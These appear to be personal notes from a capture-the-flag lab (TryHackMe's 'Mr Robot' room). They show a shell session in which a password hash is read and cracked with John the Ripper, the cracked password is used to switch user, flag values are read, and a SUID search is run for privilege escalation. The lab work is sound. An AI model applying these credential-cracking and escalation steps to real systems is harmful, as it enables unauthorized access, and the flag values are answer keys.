User-agent: *
fsocity.dic
key-1-of-3.txt   - 073403c8a58a1f80d943455fb30724b9
 




daemon@linux:/home/robot$ 
daemon@linux:/home/robot$ whoami
whoami
daemon
daemon@linux:/home/robot$ ls -lah
ls -lah
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b


┌──(kali㉿kali)-[~/tryhackme/robot]
└─$ john md5.hash --wordlist=fsocity.dic --format=Raw-MD5                                                  148 ⨯ 4 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2021-06-10 11:52) 0g/s 17161Kp/s 17161Kc/s 17161KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
Session completed



cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ su robot
su robot
Password: ABCDEFGHIJKLMNOPQRSTUVWXYZ

su: Authentication failure
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959




find / -perm +6000 2>/dev/null | grep '/bin/' 

use nmap to get root